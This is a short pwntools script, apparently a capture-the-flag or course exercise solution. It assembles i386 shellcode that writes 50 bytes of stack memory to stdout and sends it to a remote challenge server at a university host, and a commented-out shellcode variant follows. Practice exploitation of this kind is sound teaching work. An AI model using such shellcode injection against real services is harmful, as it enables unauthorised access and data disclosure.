#!/bin/python3.11
from pwn import *

context.arch = "i386"
context.os = "linux"

# S = process("./bin")
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10001)

print(hex(0x100000000 - 0xffffce36))
shellcode = asm(\
    '''
    xor ebx, ebx
    mul ebx
    mov al, 0x4
    mov bl, 0x1
    xor ecx, ecx
    mov ecx, ebp
    sub ecx, 0x42
    mov dl, 50
    int 0x80

    xor eax, eax
    mov al, 0x1
    int 0x80
'''
)
print(shellcode)
print(S.recvuntil(b"le!\n"))
print(S.recvuntil(b":\n"))
S.sendline(shellcode)
print(S.recvall())

#    xor eax, eax
#    mov al, 0x4
#    xor ebx, ebx
#    mov bl, 0x1
#    xor ecx, ecx
#    mov ecx, 0xffffce36
#    xor edx, edx
#    mov dl, 50